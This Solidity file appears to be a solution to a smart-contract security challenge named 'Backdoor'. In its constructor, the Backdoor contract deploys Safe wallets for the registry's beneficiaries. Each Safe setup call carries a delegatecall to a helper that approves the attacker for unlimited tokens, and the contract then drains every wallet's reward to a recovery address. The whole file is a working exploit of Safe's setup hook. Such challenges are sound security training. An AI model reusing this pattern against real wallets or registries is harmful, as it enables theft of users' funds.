// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SafeProxyFactory} from "safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {WalletRegistry} from "./WalletRegistry.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Safe} from "safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";

contract Approve {
  function approve(address attacker, IERC20 token) public {
        token.approve(attacker, type(uint256).max);
  }
}

contract Backdoor {
    Safe immutable safe;
    WalletRegistry immutable walletRegistry;
    SafeProxyFactory immutable safeProxyFactory;
    address immutable recovery;
    IERC20 private immutable token;
    
    uint256 constant USERS_COUNT = 4; 

    constructor(Safe _safe, WalletRegistry _walletRegistry, SafeProxyFactory _safeProxyFactory, address _recovery, address[] memory initialBeneficiaries) {
        safe = _safe;
        walletRegistry = _walletRegistry;
        safeProxyFactory = _safeProxyFactory;
        recovery = _recovery;
        token = IERC20(walletRegistry.token());

        Approve approve = new Approve();
        uint256 threshold = 1;
        address to = address(approve);
        bytes memory data = abi.encodeCall(Approve.approve, (address(this), token));
        address[] memory owners = new address[](1);
        address wallet;

        for(uint256 i = 0; i < initialBeneficiaries.length; i++){
            owners[0] = initialBeneficiaries[i];
            
            bytes memory initializer = abi.encodeCall(
                Safe.setup,(
                    owners,
                    threshold,
                    to,
                    data,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            wallet = address(safeProxyFactory.createProxyWithCallback(address(_safe), initializer, 0, walletRegistry));
            token.transferFrom(wallet, recovery, token.balanceOf(wallet));
        }
    }

}